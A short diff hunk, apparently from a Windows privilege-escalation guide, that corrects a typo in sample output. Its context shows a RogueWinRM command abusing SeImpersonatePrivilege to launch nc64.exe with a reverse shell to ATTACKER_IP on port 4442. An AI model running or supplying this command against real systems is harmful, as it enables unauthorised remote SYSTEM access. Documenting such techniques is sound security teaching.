@@ -49,7 +49,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 C:\> RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 Listening for Connection on Port 5985 ....
 Received HTTP negotiate request
-Sending the 401 HTTP Response with NTLM type 2 Challange
+Sending the 401 HTTP Response with NTLM type 2 Challenge
 Received HTTP Packet with NTLM type 3 Response
 Using NTLM type 3 Response in AcceptSecurityContext()
 
